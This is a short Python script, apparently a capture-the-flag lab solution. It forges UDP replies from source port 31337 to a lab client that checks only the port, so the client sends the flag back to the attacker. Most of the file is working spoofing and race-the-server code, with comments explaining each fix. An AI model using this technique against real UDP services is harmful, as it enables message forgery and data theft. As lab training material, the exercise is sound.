#!/usr/bin/env python3
"""
udp_spoofing_3 — forge the server's reply to the client so the client sends us the flag.

The client (10.0.0.2:31338) accepts a reply only if its UDP source port is 31337 and the
payload starts with b"FLAG". It never checks the source IP, so a plain datagram bound to
source port 31337 is enough (minimal, no-root spoof). We tell it to send the flag to
10.0.0.1:<our port>, and we catch it on the same socket.
"""

import socket

# --- original attempt, kept for reference ----------------------------------
# HOST = '0.0.0.0'
# CLIENT_HOST = '10.0.0.3'
# CLIENT_PORT = 31338
#
# message = b'FLAG:10.0.0.1:31137'
#
# if __name__ == "__main__":
#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     sock.bind((HOST, 31337))
#
#     while True:
#         try:
#             sock.sendto(message, (CLIENT_HOST, CLIENT_PORT))
#             client_message, (CLIENT_HOST, CLIENT_PORT) = sock.recvfrom(1024)
#             print(client_message.decode())
#
#         except ConnectionError:
#             continue
# ---------------------------------------------------------------------------

HOST = '0.0.0.0'
SRC_PORT = 31337            # client checks peer_port == 31337, so we must send FROM 31337

TARGET_HOST = '10.0.0.2'    # fix #1: the CLIENT (10.0.0.3 was the server, which ignores us)
TARGET_PORT = 31338         # the client's listening port

FLAG_HOST = '10.0.0.1'      # us: where the client should deliver the flag
FLAG_PORT = SRC_PORT        # fix #2: reuse the bound port so this socket catches the flag

# payload must be exactly FLAG:<host>:<port>  (client does split(b":") into 3 parts)
message = f'FLAG:{FLAG_HOST}:{FLAG_PORT}'.encode()

if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((HOST, SRC_PORT))
    sock.settimeout(0.5)    # fix #4: don't block forever — keep resending to win the race

    print(f"[*] forging {message!r} -> {TARGET_HOST}:{TARGET_PORT} (sport {SRC_PORT})")
    while True:
        try:
            sock.sendto(message, (TARGET_HOST, TARGET_PORT))
            # fix #3: separate vars so we never overwrite the send target
            data, (peer_host, peer_port) = sock.recvfrom(1024)
            if data.strip():                       # the flag; server's NONE never reaches us
                print(f"[+] from {peer_host}:{peer_port}: {data.decode(errors='replace')}")
                break
        except socket.timeout:
            continue                               # quiet window -> loop and resend
        except ConnectionError:
            continue
